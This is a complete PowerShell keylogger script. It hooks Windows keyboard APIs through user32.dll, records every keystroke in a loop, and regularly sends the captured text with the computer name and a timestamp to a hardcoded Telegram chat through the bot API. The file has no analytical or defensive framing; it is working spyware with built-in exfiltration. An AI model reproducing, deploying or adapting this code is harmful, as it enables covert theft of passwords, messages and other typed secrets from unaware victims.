$Token = "$tg"
$PassPhrase = "$env:COMPUTERNAME"
$URL = 'https://api.telegram.org/bot{0}' -f $Token
$ChatID = "6686157223"

# Get the chat ID if not available
while ($chatID.length -eq 0) {
    $updates = Invoke-RestMethod -Uri ($URL + "/getUpdates")
    if ($updates.ok -eq $true) {
        $latestUpdate = $updates.result[-1]
        if ($latestUpdate.message -ne $null) {
            $chatID = $latestUpdate.message.chat.id
        }
    }
    Sleep 10
}

Function KeyCapture {
    $MessageToSend = New-Object psobject
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME : KeyCapture Started." -Force
    irm -Method Post -Uri ($URL + '/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"

    # Define API for capturing keys
    $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); 
            [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate); 
            [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int MapVirtualKey(uint uCode, int uMapType); 
            [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
    $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

    $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
    $KeypressThreshold = [TimeSpan]::FromSeconds(10)

    While ($true) {
        $keyPressed = $false
        try {
            while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
                Start-Sleep -Milliseconds 30
                for ($asc = 8; $asc -le 254; $asc++) {
                    $keyst = $API::GetAsyncKeyState($asc)
                    if ($keyst -eq -32767) {
                        $keyPressed = $true
                        $LastKeypressTime.Restart()

                        # Process each key
                        $vtkey = $API::MapVirtualKey($asc, 3)
                        $kbst = New-Object Byte[] 256
                        $checkkbst = $API::GetKeyboardState($kbst)
                        $logchar = New-Object -TypeName System.Text.StringBuilder
                        
                        # Capture the correct character based on key code
                        if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                            $LString = $logchar.ToString()

                            # Special handling for backspace and enter
                            if ($asc -eq 8) { $LString = "[BKSP]" }
                            if ($asc -eq 13) { $LString = "[ENT]" }
                            if ($asc -eq 27) { $LString = "[ESC]" }

                            # Append the captured key to the message
                            $nosave += $LString
                        }
                    }
                }
            }
        } finally {
            If ($keyPressed) {
                $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
                $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
                $escmsg = "Keys Captured at $timestamp from $env:COMPUTERNAME ($env:COMPUTERNAME IP): $escmsgsys"
                $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$escmsg" -Force
                irm -Method Post -Uri ($URL + '/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"

                $keyPressed = $false
                $nosave = ""
            }
        }
        $LastKeypressTime.Restart()
        Start-Sleep -Milliseconds 10
    }
}
